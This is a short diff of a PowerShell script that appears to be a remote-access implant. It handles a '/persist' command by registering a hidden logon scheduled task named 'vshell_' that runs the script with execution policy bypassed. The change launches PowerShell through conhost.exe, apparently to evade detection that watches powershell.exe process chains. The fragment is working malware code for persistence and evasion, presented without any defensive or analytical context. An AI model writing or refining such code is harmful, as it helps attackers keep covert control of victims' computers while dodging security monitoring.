@@ -152,7 +152,7 @@ function CommandListener
 
                 if ($text -match "^/persist") {
                     try {
-                        $action   = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$script:ScriptPath`""
+                        $action   = New-ScheduledTaskAction -Execute "conhost.exe" -Argument "-- powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$script:ScriptPath`""
                         $trigger  = New-ScheduledTaskTrigger -AtLogOn -User $env:USERNAME
                         $settings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -ExecutionTimeLimit 0
                         Register-ScheduledTask -TaskName "vshell_$session_id" -Action $action -Trigger $trigger -Settings $settings -RunLevel Limited -Force | Out-Null
